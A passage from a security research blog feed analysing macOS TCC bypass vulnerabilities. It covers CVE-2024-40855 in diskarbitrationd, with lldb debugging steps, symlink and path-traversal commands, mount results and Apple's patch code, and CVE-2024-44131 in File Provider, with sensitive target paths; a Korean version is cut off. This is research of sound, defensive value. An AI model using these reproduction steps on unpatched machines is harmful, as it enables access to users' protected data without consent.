class="hljs-string">&apos;realpath&apos;</span>, locations = 1, resolved = 1, hit count = 0  1.1: <span class="hljs-built_in">where</span> = libsystem_c.dylib`realpath, address = 0x00000001921de874, resolved, hit count = 0 2: name = <span class="hljs-string">&apos;DADiskMountWithArgumentsCommon&apos;</span>, locations = 1, resolved = 1, hit count = 1  2.1: <span class="hljs-built_in">where</span> = DiskArbitration`DADiskMountWithArgumentsCommon, address = 0x000000019a1bdb48, resolved, hit count = 1 3: address = DiskArbitration[0x0000000188325c1c], locations = 1, resolved = 1, hit count = 1  3.1: <span class="hljs-built_in">where</span> = DiskArbitration`DADiskMountWithArgumentsCommon + 212, address = 0x000000019a1bdc1c, resolved, hit count = 1 4: name = <span class="hljs-string">&apos;__DAQueueRequest&apos;</span>, locations = 1, resolved = 1, hit count = 1  4.1: <span class="hljs-built_in">where</span> = DiskArbitration`__DAQueueRequest, address = 0x000000019a1bcde0, resolved, hit count = 1</code></pre><p>Attach <code>lldb</code> to the <code>diskarbitrationd</code> process and set a breakpoint for <code>sandbox_check_by_audit_token</code>:</p><pre><code class="hljs routeros">(lldb) breakpoint listCurrent breakpoints:2: name = <span class="hljs-string">&apos;sandbox_check_by_audit_token&apos;</span>, locations = 1, resolved = 1, hit count = 4  2.1: where = libsystem_sandbox.dylib`sandbox_check_by_audit_token,<span class="hljs-built_in"> address </span>= 0x000000019d5a61cc, resolved, hit count = 4</code></pre><p>Prepare the required <strong>symbolic links and directories</strong>:</p><pre><code class="hljs gradle">ln -s <span class="hljs-regexp">/private/</span>tmp<span class="hljs-regexp">/deep/</span><span class="hljs-number">1</span><span class="hljs-regexp">/2 /</span><span class="hljs-keyword">private</span><span class="hljs-regexp">/tmp/</span>startheremkdir -p <span class="hljs-string">&quot;/private/tmp/Users/crab/Library/Application Support/com.apple.TCC/&quot;</span></code></pre><hr><p><strong>Debugging with LLDB After Execution</strong></p><ol><li>Run the program and reach a breakpoint</li></ol><pre><code class="hljs routeros">(lldb) runProcess 1591 launched: <span class="hljs-string">&apos;/Users/crab/m&apos;</span> (arm64)Process 1591 stopped* thread #1,<span class="hljs-built_in"> queue </span>= <span class="hljs-string">&apos;com.apple.main-thread&apos;</span>, stop reason = breakpoint 2.1</code></pre><ol><li>Perform a memory dump on the address pointed to by the <code>X1</code> register</li></ol><pre><code class="hljs angelscript">(lldb) memory read -f p $x1<span class="hljs-number">0x600000024060</span>: <span class="hljs-number">0x01000001fa131911</span> <span class="hljs-number">0x0001cc4fc6001d80</span> <span class="hljs-number">0x0800010060015821</span> <span class="hljs-number">0x0000600000f24000</span></code></pre><ol><li>Verify the path string</li></ol><pre><code class="hljs angelscript">(lldb) memory read -f s <span class="hljs-number">0x0000600000f24000</span>+<span class="hljs-number">16</span><span class="hljs-number">0x600000f24010</span>: <span class="hljs-string">&quot;^file:///private/tmp/starthere/../../../Users/crab/Library/Application%20Support/com.apple.TCC/&quot;</span></code></pre><ol><li>Stop at the <code>__DAQueueRequest</code> breakpoint and check the value of the <code>X4</code> register</li></ol><pre><code class="hljs arduino">(lldb) <span class="hljs-keyword">register</span> <span class="hljs-built_in">read</span> $x4      x4 = <span class="hljs-number">0x0000600000020000</span></code></pre><ol><li>Verify the path string</li></ol><pre><code class="hljs perl">(lldb) memory <span class="hljs-keyword">read</span> -f <span class="hljs-keyword">s</span> $x4+<span class="hljs-number">16</span><span class="hljs-number">0x600000020010</span>: <span class="hljs-string">&quot;Kfile:///private/tmp/Users/crab/Library/Application%20Support/com.apple.TCC/&quot;</span></code></pre><ol><li>Overwrite the <code>X4</code> register with the original path value</li></ol><pre><code class="hljs arduino">(lldb) <span class="hljs-keyword">register</span> <span class="hljs-built_in">write</span> $x4 <span class="hljs-number">0x0000600000f24000</span>(lldb) c<span class="hljs-built_in">Process</span> <span class="hljs-number">1606</span> resuming</code></pre><hr><ol><li>The <code>diskarbitrationd</code> process stops at the <code>sandbox_check_by_audit_token</code> breakpoint.</li></ol><pre><code class="hljs routeros">(lldb) cProcess 113 resumingProcess 113 stopped* thread #2,<span class="hljs-built_in"> queue </span>= <span class="hljs-string">&apos;DAServer&apos;</span>, stop reason = breakpoint 2.1</code></pre><ol><li>Verify that the path remains unchanged via memory dump</li></ol><pre><code class="hljs stata">(lldb) <span class="hljs-keyword">memory</span> <span class="hljs-keyword">read</span> -f s 0x000000014ea0cc900x14ea0cc90: <span class="hljs-string">&quot;/private/tmp/starthere/../../../Users/crab/Library/Application Support/com.apple.TCC&quot;</span></code></pre><ol><li>Check the return value after calling <code>sandbox_check_by_audit_token</code>.</li></ol><pre><code class="hljs arduino">(lldb) finish(lldb) <span class="hljs-keyword">register</span> <span class="hljs-built_in">read</span> $x0      x0 = <span class="hljs-number">0x0000000000000000</span></code></pre><p>Since <code>sandbox_check_by_audit_token</code> returns <code>0</code>, the check is passed.</p><ol><li>Replace <code>starthere</code> with a directory, run <code>diskarbitrationd</code>, and verify the mount result</li></ol><pre><code class="hljs awk">crab@see /tmp % rm startherecrab@see /tmp % mkdir starthere(lldb) ccrab@see /tmp % mount...<span class="hljs-regexp">/dev/</span>disk6s1 on <span class="hljs-regexp">/Users/</span>crab<span class="hljs-regexp">/Library/</span>Application Support/com.apple.TCC (apfs, local, nodev, nosuid, journaled, noowners, mounted by crab)</code></pre><h2 id="Patch-Notes"><a href="#Patch-Notes" class="headerlink" title="Patch Notes"></a>Patch Notes</h2><p>Apple has fixed this vulnerability in macOS Sequoia 15.0.</p><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( mntpath ){    <span class="hljs-keyword">if</span> ( ( _argument1 &amp; kDADiskMountOptionNoFollow ) == <span class="hljs-number">0</span> )    {        <span class="hljs-keyword">if</span> ( realpath( mntpath, path ) )        {            CFTypeRef mountpath = CFURLCreateFromFileSystemRepresentation( kCFAllocatorDefault, ( <span class="hljs-keyword">void</span> * ) path, <span class="hljs-built_in">strlen</span>( path ), TRUE );            <span class="hljs-keyword">if</span> ( mountpath )            {                DARequestSetArgument2( request, CFURLGetString( mountpath ) );                CFRelease ( mountpath );            }        }        <span class="hljs-keyword">else</span>        {            status = kDAReturnBadArgument;        }    }}</code></pre><p>They now perform path resolution within <code>diskarbitrationd</code> when handling requests instead of relying on the client side. This prevents attackers from injecting paths containing <code>../</code> elements while maintaining the expected behavior for legitimate callers.</p><p>However, this validation logic is only applied if the <code>kDADiskMountOptionNoFollow</code> flag is <strong>not</strong> provided. If an attacker explicitly sets <code>kDADiskMountOptionNoFollow</code>, the original attack would still be possible.</p><p>To fully mitigate this, Apple made an additional change to <code>sandbox_check_by_audit_token</code>:</p><pre><code class="hljs c">status = sandbox_check_by_audit_token(_token, <span class="hljs-string">&quot;file-mount&quot;</span>, SANDBOX_FILTER_PATH | SANDBOX_CHECK_ALLOW_APPROVAL | SANDBOX_CHECK_CANONICAL, path);</code></pre><p>The <code>SANDBOX_CHECK_CANONICAL</code> option was added to the validation process. With this, the sandbox check now <strong>automatically fails</strong> if the path contains symbolic links or directory traversal elements (<code>../</code>). This allows the system to block the attack at an earlier stage.</p><h1 id="3-Other-Types-of-TCC-Bypass-Vulnerabilities"><a href="#3-Other-Types-of-TCC-Bypass-Vulnerabilities" class="headerlink" title="3. Other Types of TCC Bypass Vulnerabilities"></a>3. Other Types of TCC Bypass Vulnerabilities</h1><p><img src="/2025/01/19/clalxk/MacOS_TCC-Bypass_en/image2.png" alt="image.png"></p><h3 id="CVE-2024-44131"><a href="#CVE-2024-44131" class="headerlink" title="CVE-2024-44131"></a>CVE-2024-44131</h3><blockquote><p>This is a TCC bypass vulnerability in File Provider, an extension that allows users to access files and folders synchronized with remote storage (such as iCloud) on macOS and iOS. The vulnerability arises due to a symlink validation flaw when the Files app and the fileproviderd system process handle file operations.</p></blockquote><h3 id="Version-Information-1"><a href="#Version-Information-1" class="headerlink" title="Version Information"></a><strong>Version Information</strong></h3><p>macOS : 5.3 &#x2264; 14.7</p><h3 id="File-Provider"><a href="#File-Provider" class="headerlink" title="File Provider?"></a>File Provider?</h3><p>A <strong>File Provider</strong> is an extension that allows other apps to access files and folders synchronized with remote storage.</p><p>macOS and iOS use the <strong>Transparency, Consent, and Control (TCC)</strong> mechanism to notify users when an application attempts to access sensitive information&#x2014;such as <strong>photos, GPS location, contacts, etc.</strong>&#x2014;and allows them to approve or deny the request.</p><p><a href="https://developer.apple.com/documentation/fileprovider">Apple Documentation on File Provider</a></p><p>The vulnerability exploits a <strong>symlink attack</strong> targeting the <strong>Files app</strong> and the <strong><code>fileproviderd</code> system process</strong>.</p><h3 id="Key-Components-Involved-in-the-Attack"><a href="#Key-Components-Involved-in-the-Attack" class="headerlink" title="Key Components Involved in the Attack"></a><strong>Key Components Involved in the Attack</strong></h3><p>&#x1F4C1; <strong>Files.app</strong></p><p>The default file explorer on iOS and macOS. It allows users to browse and manage files in iCloud Drive, local storage, external storage devices, and third-party cloud services (e.g., Google Drive, Dropbox).</p><p>&#x2699;&#xFE0F; <strong>fileproviderd</strong></p><p>A system process in macOS and iOS that manages the <strong>File Provider</strong> extension. It plays a crucial role in handling file synchronization and access between the Files app and cloud storage.</p><h3 id="How-the-Attack-Works"><a href="#How-the-Attack-Works" class="headerlink" title="How the Attack Works"></a><strong>How the Attack Works</strong></h3><p>When a user moves or copies a file using <strong>Files.app</strong>, a malicious app running in the background can intercept and manipulate the operation. The attacker <strong>exploits the high privileges of <code>fileproviderd</code></strong> to interfere with file operations <strong>without triggering a TCC prompt (permission request window).</strong></p><p>Typically, mitigation techniques prevent attackers from exploiting <strong>symlink race conditions</strong> or <strong>path traversal attacks</strong> when privileged processes copy, move, or delete files. Most file operation APIs include checks to <strong>verify whether the source or destination is a symlink</strong> and are designed to abort the operation if a symlink is detected.</p><p>However, in this vulnerability, attackers <strong>bypass the existing checks</strong> by inserting a symlink <strong>one directory level above</strong> the target file <strong>midway through the operation</strong>, instead of placing a symlink directly at the final file path <strong>before</strong> the operation starts.</p><h3 id="Comparison-of-Traditional-vs-New-Symlink-Attack-Techniques"><a href="#Comparison-of-Traditional-vs-New-Symlink-Attack-Techniques" class="headerlink" title="Comparison of Traditional vs. New Symlink Attack Techniques"></a><strong>Comparison of Traditional vs. New Symlink Attack Techniques</strong></h3><p><img src="/2025/01/19/clalxk/MacOS_TCC-Bypass_en/image3.png" alt="image.png"></p><p><strong>Traditional Symlink Attack</strong></p><ul><li>Attackers place a <strong>symlink at the final file or directory level</strong>.</li><li>Security validation detects the symlink and blocks the attack.</li></ul><p><img src="/2025/01/19/clalxk/MacOS_TCC-Bypass_en/image4.png" alt="image.png"></p><p><strong>CVE-2024-44131 Symlink Attack</strong></p><ul><li>Attackers insert a <strong>symlink at the parent directory level</strong> <em>after</em> the file copy has started.</li><li>Since <strong>previous checks only validated the final file/directory name</strong>, this approach <strong>bypasses the security check</strong> by altering the path mid-operation.</li><li>As a result, attackers can <strong>hijack files without triggering a TCC prompt</strong> or <strong>copy files that require special privileges</strong>.</li></ul><h3 id="Paths-Accessible-by-fileproviderd"><a href="#Paths-Accessible-by-fileproviderd" class="headerlink" title="Paths Accessible by fileproviderd"></a><strong>Paths Accessible by <code>fileproviderd</code></strong></h3><p><img src="/2025/01/19/clalxk/MacOS_TCC-Bypass_en/image5.png" alt="image.png"></p><p>&#x1F4CD; <strong>Key Target Path</strong> <code>/var/mobile/Library/Application Support/FileProvider/AccessControl.db</code> This database stores a list of apps that have interacted with the Files app and the file system. Attackers can potentially exploit it for unauthorized access.</p><p><img src="/2025/01/19/clalxk/MacOS_TCC-Bypass_en/image6.png" alt="image.png"></p><h3 id="Examples-of-Sensitive-Data-Paths"><a href="#Examples-of-Sensitive-Data-Paths" class="headerlink" title="Examples of Sensitive Data Paths"></a><strong>Examples of Sensitive Data Paths</strong></h3><ol><li><p><strong>Apple Pages backup documents</strong></p><p> &#x1F4C2; <code>/var/mobile/Library/Mobile Documents/com~apple~Pages</code></p></li><li><p><strong>Files manually saved to iCloud Drive (including Downloads)</strong></p><p> &#x1F4C2; <code>/var/mobile/Library/Mobile Documents/com~apple~CloudDocs</code></p></li><li><p><strong>WhatsApp backup data</strong></p><p> &#x1F4C2; <code>/var/mobile/Library/Mobile Documents/57T9237FN3~net~whatsapp~WhatsApp</code></p><p> (<em>This path uses a fixed identifier instead of a UUID, making it predictable for attackers.</em>)</p></li></ol><p>By exploiting this vulnerability, attackers can access and exfiltrate <strong>iCloud backup data</strong> belonging to both first-party and third-party apps. They can do this by <strong>copying, moving, or deleting</strong> files and directories under the main target data path: &#x1F4C2; <strong><code>/var/mobile/Library/Mobile Documents/</code></strong></p><hr><h3 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h3><p><a href="https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/">https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/</a></p><p><a href="https://zeroclick.sh/blog/macos-tcc/">https://zeroclick.sh/blog/macos-tcc/</a></p><p><a href="https://www.cyberlibrary.fr/en/docs/old/macos-tcc-bypasses">https://www.cyberlibrary.fr/en/docs/old/macos-tcc-bypasses</a></p><p><a href="https://eclecticlight.co/2023/02/10/privacy-what-tcc-does-and-doesnt/">https://eclecticlight.co/2023/02/10/privacy-what-tcc-does-and-doesnt/</a></p><p><a href="https://www.kandji.io/blog/macos-audit-story-part2">https://www.kandji.io/blog/macos-audit-story-part2</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/clalxk/">clalxk</category>
      
      <category domain="https://hackyboiz.github.io/tags/MacOS/">MacOS</category>
      
      <category domain="https://hackyboiz.github.io/tags/TCC-Bypass/">TCC Bypass</category>
      
      
      <comments>https://hackyboiz.github.io/2025/01/19/clalxk/MacOS_TCC-Bypass_en/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] MacOS TCC Bypass (ko)</title>
      <link>https://hackyboiz.github.io/2025/01/19/clalxk/MacOS_TCC-Bypass_ko/</link>
      <guid>https://hackyboiz.github.io/2025/01/19/clalxk/MacOS_TCC-Bypass_ko/</guid>
      <pubDate>Sun, 19 Jan 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&lt;img src=&quot;/2025/01/19/clalxk/MacOS_TCC-Bypass_ko/TCC_Bypass.png&quot; alt=&quot;image.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC138;&amp;#xC694;. clalxk</description>
        
      
      
      
      <content:encoded><![CDATA[<p><img src="/2025/01/19/clalxk/MacOS_TCC-Bypass_ko/TCC_Bypass.png" alt="image.png"></p><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;. clalxk &#xC785;&#xB2C8;&#xB2E4;!<br>&#xBBF8;&#xB798;&#xC758; <del>&#xC0AC;&#xACFC;&#xD138;&#xC774;&#xBC94;</del>&#xC744; &#xAFC8;&#xAFB8;&#xBA70; MacOS TCC Bypass &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xAC00;&#xC9C0;&#xACE0; &#xC654;&#xC2B5;&#xB2C8;&#xB2E4; &#x314E;&#x314E; </p><p><a href="https://hackyboiz.github.io/2024/11/27/clalxk/CVE-2024-44175/">https://hackyboiz.github.io/2024/11/27/clalxk/CVE-2024-44175/</a> </p><p>&#xC624;&#xB298; &#xC0B4;&#xD3B4;&#xBCFC; &#xB0B4;&#xC6A9;&#xC740; &#xC704; &#xCDE8;&#xC57D;&#xC810;&#xACFC; &#xC5F0;&#xACC4;&#xB429;&#xB2C8;&#xB2E4;! </p><p>&#xC774;&#xC804; &#xAE00;&#xC5D0;&#xC11C;&#xB294; <code>diskarbitrationd</code> &#xC2DC;&#xC2A4;&#xD15C; &#xB370;&#xBAAC;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xB2E4;&#xB8E8;&#xC5C8;&#xB294;&#xB370;&#xC694;. &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC774;&#xC6A9;&#xD558;&#xBA74; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xAC70;&#xB098; &#xC0AC;&#xC6A9;&#xC790; &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C;&#xC744; &#xD1B5;&#xD574; &#xAD8C;&#xD55C;&#xC744; &#xC0C1;&#xC2B9;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xBC88; &#xAE00;&#xC5D0;&#xC11C;&#xB294; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xB294; &#xAC83;&#xBFD0;&#xB9CC; &#xC544;&#xB2C8;&#xB77C;, &#xC0AC;&#xC6A9;&#xC790;&#xC758; <strong>TCC(Transparency, Consent, and Control)</strong> &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xC5D0; &#xB9C8;&#xC6B4;&#xD2B8;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xD5C8;&#xC6A9;&#xD558;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC778; <strong>CVE-2024-40855</strong>&#xC5D0; &#xB300;&#xD574; &#xB2E4;&#xB8E8;&#xB824;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; <code>diskarbitrationd</code>&#xC5D0;&#xC11C; Directory Traversal &#xACF5;&#xACA9;&#xC744; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><h1 id="1-TCC-Bypass"><a href="#1-TCC-Bypass" class="headerlink" title="1. TCC Bypass?"></a>1. TCC Bypass?</h1><p>TCC(Transparency, Consent, and Control)&#xB294; <strong>Apple&#xC758; &#xBCF4;&#xC548; &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;</strong>&#xB85C;, &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC774; <strong>&#xBBFC;&#xAC10;&#xD55C; &#xC0AC;&#xC6A9;&#xC790; &#xB370;&#xC774;&#xD130;&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xB54C; &#xC774;&#xB97C; &#xAD00;&#xB9AC;&#xD558;&#xACE0; &#xBCF4;&#xD638;</strong>&#xD558;&#xB294; &#xC5ED;&#xD560;&#xC744; &#xD569;&#xB2C8;&#xB2E4;. &#xC774; TCC &#xBA54;&#xCEE4;&#xB2C8;&#xC998;&#xC740; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#x2018;&#xC124;&#xC815;&#x2019; &#xC571;&#xC744; &#xD1B5;&#xD574; &#xAC01; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158; &#xBCC4;&#xB85C; &#xAD8C;&#xD55C;&#xC744; &#xAD00;&#xB9AC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p><img src="/2025/01/19/clalxk/MacOS_TCC-Bypass_ko/image1.png" alt="image.png"></p><p>&#xC571;&#xC744; &#xC2E4;&#xD589;&#xD588;&#xC744; &#xB54C;, &#x2018;&#xB9C8;&#xC774;&#xD06C; &#xAD8C;&#xD55C;&#xC744; &#xD5C8;&#xC6A9;&#xD558;&#xC2DC;&#xACA0;&#xC2B5;&#xB2C8;&#xAE4C;?&#x2019;&#xC640; &#xAC19;&#xC740; &#xD31D;&#xC5C5;&#xCC3D;&#xC744; &#xBCF4;&#xC2E0; &#xC801;&#xC774; &#xC788;&#xC73C;&#xC2E0;&#xAC00;&#xC694;?</p><p>&#xC704;&#xC640; &#xAC19;&#xC774; <strong>TCC&#xB294; macOS&#xC758; &#x2018;&#xC571; &#xAD8C;&#xD55C; &#xAD00;&#xB9AC; &#xC2DC;&#xC2A4;&#xD15C;&#x2019;</strong> &#xC774;&#xB77C;&#xACE0; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB54C;, <strong>&#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xC2B9;&#xC778;&#xC5C6;&#xC774;</strong> &#xBBFC;&#xAC10;&#xD55C; &#xB370;&#xC774;&#xD130;(&#xC0AC;&#xC9C4;, &#xB9C8;&#xC774;&#xD06C;, &#xC704;&#xCE58; &#xC815;&#xBCF4; &#xB4F1;)&#xC5D0; &#xBB34;&#xB2E8;&#xC73C;&#xB85C; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xB294; &#xBC29;&#xBC95;&#xC744; &#xCC3E;&#xC544; &#xACF5;&#xACA9;&#xD558;&#xB294; &#xAC83;&#xC744; <strong>TCC Bypass</strong> &#xCDE8;&#xC57D;&#xC810;&#xC774;&#xB77C;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.</p><h1 id="2-&#xCDE8;&#xC57D;&#xC810;-&#xC815;&#xBCF4;-&#xBC0F;-&#xBD84;&#xC11D;"><a href="#2-&#xCDE8;&#xC57D;&#xC810;-&#xC815;&#xBCF4;-&#xBC0F;-&#xBD84;&#xC11D;" class="headerlink" title="2. &#xCDE8;&#xC57D;&#xC810; &#xC815;&#xBCF4; &#xBC0F; &#xBD84;&#xC11D;"></a>2. &#xCDE8;&#xC57D;&#xC810; &#xC815;&#xBCF4; &#xBC0F; &#xBD84;&#xC11D;</h1><h3 id="CVE-2024-40855"><a href="#CVE-2024-40855" class="headerlink" title="CVE-2024-40855"></a>CVE-2024-40855</h3><blockquote><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; macOS&#xC758; &#xC2DC;&#xC2A4;&#xD15C; &#xB370;&#xBAAC;&#xC778; diskarbitrationd&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xBA70;, TCC Bypass&#xB97C; &#xD1B5;&#xD574; Directory Traversal &#xACF5;&#xACA9;&#xC744; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p></blockquote><h3 id="Version-Information"><a href="#Version-Information" class="headerlink" title="Version Information"></a><strong>Version Information</strong></h3><p>macOS : 13.0 &#x2264; 14.6</p><h3 id="diskarbitrationd"><a href="#diskarbitrationd" class="headerlink" title="diskarbitrationd"></a><strong>diskarbitrationd</strong></h3><p><code>diskarbitrationd</code>&#xB294; 3&#xAC00;&#xC9C0;&#xC758; &#xD2B9;&#xC9D5;&#xC744; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>&#xB8E8;&#xD2B8;(root) &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC2E4;&#xD589;</li><li>&#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xB0B4;&#xC5D0;&#xC11C;&#xB3C4; &#xC811;&#xADFC; &#xAC00;&#xB2A5;</li><li><code>com.apple.private.security.storage-exempt.heritable</code> &#xC18D;&#xC131;&#xC744; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xC5B4;, &#xC0AC;&#xC2E4;&#xC0C1; <strong>Full Disk Access</strong>&#xC744; &#xAC00;&#xC9D0;</li></ul><p>&#xC704; 3&#xAC00;&#xC9C0;&#xC758; &#xD2B9;&#xC9D5;&#xC73C;&#xB85C; &#xC778;&#xD558;&#xC5EC; <code>diskarbitrationd</code>&#xB294; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;&#xB97C; &#xBC97;&#xC5B4;&#xB098;&#xAC70;&#xB098; &#xB8E8;&#xD2B8; &#xAD8C;&#xD55C;&#xC744; &#xC0C1;&#xC2B9;&#xC2DC;&#xD0AC; &#xC218; &#xC5C6;&#xB3C4;&#xB85D; &#xAC80;&#xC99D;&#xC744; &#xC218;&#xD589;&#xD574;&#xC57C; &#xD558;&#xB294;&#xB370;&#xC694;. &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xAC80;&#xC99D;&#xC740; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;&#xB97C; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC5C6;&#xB3C4;&#xB85D; &#xD560; &#xBFD0;&#xB9CC; &#xC544;&#xB2C8;&#xB77C;, <strong>TCC&#xB85C; &#xBCF4;&#xD638;&#xB41C; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC5D0; &#xB9C8;&#xC6B4;&#xD2B8;&#xD558;&#xB294; &#xAC83;&#xC744; &#xBC29;&#xC9C0;</strong>&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. (&#xC774;&#xB54C;, &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xAC80;&#xC99D;&#xC740; &#xBCC4;&#xB3C4;&#xB85C; &#xCC98;&#xB9AC;&#xB429;&#xB2C8;&#xB2E4;.)</p><p>&#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xAC80;&#xC99D;&#xC740; &#xB2E4;&#xC74C; &#xC138; &#xAC00;&#xC9C0;&#xB97C; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xC774;&#xB8E8;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;.</p><ol><li><strong>&#xB9C8;&#xC6B4;&#xD2B8; &#xACBD;&#xB85C;(path) &#xAC80;&#xC99D;</strong><ul><li>&#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xAC00; <code>diskarbitrationd</code>&#xC5D0; &#xB9C8;&#xC6B4;&#xD2B8; &#xC9C0;&#xC810;&#xC744; &#xC804;&#xB2EC;&#xD560; &#xB54C;, <code>../</code> &#xC694;&#xC18C;&#xAC00; &#xC788;&#xB294;&#xC9C0;&#xB97C; &#xAC80;&#xC0AC;&#xD558;&#xC5EC; Directory Traversal &#xC774; &#xBD88;&#xAC00;&#xB2A5;&#xD558;&#xB3C4;&#xB85D; &#xD655;&#xC778;</li><li><strong>path resolution &#xBC1C;&#xC0DD; &#xD655;&#xC778;</strong><ul><li>&#xB9CC;&#xC57D; &#xC774;&#xD6C4; &#xB2E8;&#xACC4;&#xC5D0;&#xC11C; &#xACBD;&#xB85C; &#xBCC0;&#xD658;&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xBA74;, Symlink Attack&#xC5D0; &#xB300;&#xD55C; &#xAC80;&#xC99D; &#xBB34;&#xB825;&#xD654;</li></ul></li></ul></li><li><strong>&#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xAC80;&#xC99D;</strong><ul><li><code>diskarbitrationd</code>&#xB294; <code>sandbox_check_by_audit_token</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC;, &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0B8; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xC5B4;&#xB5A4; &#xD30C;&#xC77C; &#xBC0F; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xB294;&#xC9C0; &#xD655;&#xC778;</li></ul></li><li><strong>&#xB9C8;&#xC6B4;&#xD2B8; &#xC694;&#xCCAD; &#xC2DC; &#xCEE4;&#xB110; &#xAC80;&#xC99D;</strong><ul><li>&#xC678;&#xBD80; &#xB9C8;&#xC6B4;&#xD2B8; &#xC694;&#xCCAD;&#xC744; &#xCC98;&#xB9AC;&#xD560; &#xB54C; <code>k</code> &#xC635;&#xC158;&#xC744; &#xC0AC;&#xC6A9;</li><li>&#xC774; &#xC635;&#xC158;&#xC740; &#xACBD;&#xB85C;&#xC5D0; symlink&#xAC00; &#xD3EC;&#xD568;&#xB41C; &#xACBD;&#xC6B0; &#xCEE4;&#xB110;&#xC774; &#xC694;&#xCCAD; &#xAC70;&#xBD80;</li></ul></li></ol><p>&#xBCF4;&#xD1B5;&#xC758; &#xACBD;&#xC6B0; &#xC704; &#xC21C;&#xC11C;&#xB300;&#xB85C; &#xAC80;&#xC99D;&#xC744; &#xC218;&#xD589;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><h3 id="&#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;-&#xCE21;&#xC5D0;&#xC11C;-&#xB9C8;&#xC6B4;&#xD2B8;-&#xACBD;&#xB85C;-&#xAC80;&#xC99D;-&#xC6B0;&#xD68C;-&#xAC00;&#xB2A5;"><a href="#&#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;-&#xCE21;&#xC5D0;&#xC11C;-&#xB9C8;&#xC6B4;&#xD2B8;-&#xACBD;&#xB85C;-&#xAC80;&#xC99D;-&#xC6B0;&#xD68C;-&#xAC00;&#xB2A5;" class="headerlink" title="&#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8; &#xCE21;&#xC5D0;&#xC11C; &#xB9C8;&#xC6B4;&#xD2B8; &#xACBD;&#xB85C; &#xAC80;&#xC99D; &#xC6B0;&#xD68C; &#xAC00;&#xB2A5;"></a><strong>&#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8; &#xCE21;&#xC5D0;&#xC11C; &#xB9C8;&#xC6B4;&#xD2B8; &#xACBD;&#xB85C; &#xAC80;&#xC99D; &#xC6B0;&#xD68C; &#xAC00;&#xB2A5;</strong></h3><p>&#xADF8;&#xB7EC;&#xB098; &#xCCAB; &#xBC88;&#xC9F8; &#xB2E8;&#xACC4;&#xC5D0;&#xC11C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. 